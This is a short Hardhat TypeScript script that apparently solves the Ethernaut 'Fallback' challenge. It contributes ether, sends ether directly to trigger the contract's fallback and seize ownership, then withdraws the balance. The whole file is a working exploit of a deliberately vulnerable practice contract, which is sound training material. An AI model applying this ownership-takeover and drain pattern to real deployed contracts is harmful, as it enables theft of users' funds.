import { ethers } from "hardhat";
import { BigNumberish } from "ethers";
import { Address } from "hardhat-deploy/types";
import { Fallback } from "../typechain-types/2-Fallback/Fallback";

const delay = (ms: number) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};

const main = async () => {
  const [deployer] = await ethers.getSigners();
  const contractAddress: Address = "0x50eFfcceaa873E7BC5D6738360FFe5d7a87FC0b2";
  const amountToSend: BigNumberish = ethers.utils.parseEther("0.0001")
  const fallback: Fallback = await ethers.getContractAt("Fallback", contractAddress, deployer);
  let tx = await fallback.contribute({ value: amountToSend});
  let status = (await tx.wait()).status === 1;
  console.log(`Contribute operation successful: ${status}`);

  tx = await deployer.sendTransaction({
    to: contractAddress,
    value: amountToSend
  });
  status = (await tx.wait()).status === 1;
  console.log(`Send transaction operation successful: ${status}`);
  const isModifiedOwner = deployer.address === await fallback.owner();
  console.log(`Owner is attacker?? ${isModifiedOwner}`);
  console.log(`New owner address is: ${await fallback.owner()}`);

  console.log(`Withdrawing...`);
  await fallback.withdraw();
  console.log(`Withdrawed`);
};

main();
